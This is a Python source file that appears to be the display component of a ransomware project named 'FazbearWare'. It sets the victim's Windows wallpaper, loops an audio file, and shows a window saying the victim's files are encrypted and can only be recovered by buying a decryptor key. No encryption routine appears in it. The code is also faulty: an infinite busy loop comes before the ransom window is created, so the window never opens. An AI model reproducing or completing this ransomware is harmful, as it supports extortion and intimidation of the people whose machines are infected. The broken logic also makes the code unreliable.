"""
UI - FazbearWare
Description: Create and manage the window that advise about the ransom , also play music, and change background
"""

import tkinter as tk
import ctypes
import pygame
import os


"""
CHANGE WALLPAPER AND PLAY MUSIC

"""

def change_wallpaper_play_music():
    #change wallpaper
    relative_path = "assets/img.jpg"
    absolute_path = os.path.abspath(relative_path)

    relative_path2 = "assets/aud.mp3"
    absolute_path2 = os.path.abspath(relative_path2)
    
    if not os.path.exists(absolute_path):
        pass
    try:
        result = ctypes.windll.user32.SystemParametersInfoW(20, 0, absolute_path, 3)
        
    except Exception as e:
        pass
 
    #play music 
    pygame.mixer.init()
    pygame.mixer.music.load(absolute_path2)
    pygame.mixer.music.set_volume(0.5)  # volume (0.0 - 1.0)
    pygame.mixer.music.play(-1)  # -1 = infinite loop

    # keep playing!
    while True:
     pass

change_wallpaper_play_music()

"""
RANSOM WINDOW 
"""

window = tk.Tk()
window.title("FOUR FILES ARE ENCRYPTED BY FAZBEARWARE")
window.geometry("800x600")
window.resizable(False, False)
window.configure(bg="black")
title = tk.Label(
    window,
    text="Oops! All your files are encrypted",  
    fg="red",
    bg="black",
    font=("Georgia",22),
    padx=20,pady=20
)
title.pack(side="top", pady=(20, 0)) 

instrucciones = tk.Label(
    window,
    text="Your important files are encrypted. Many of your documents, photos, videos, and other files are no longer accessible because they have been encrypted.. If you are busy looking for a way to recover your files, do not waste your time. The only way to restore your files is to purchase a unique decryptor key.",
    fg="red",
    bg="black",
    font=("Georgia", 14),
    justify="center",
    wraplength=760
)

instrucciones.pack(side="top", pady=5)
window.mainloop()
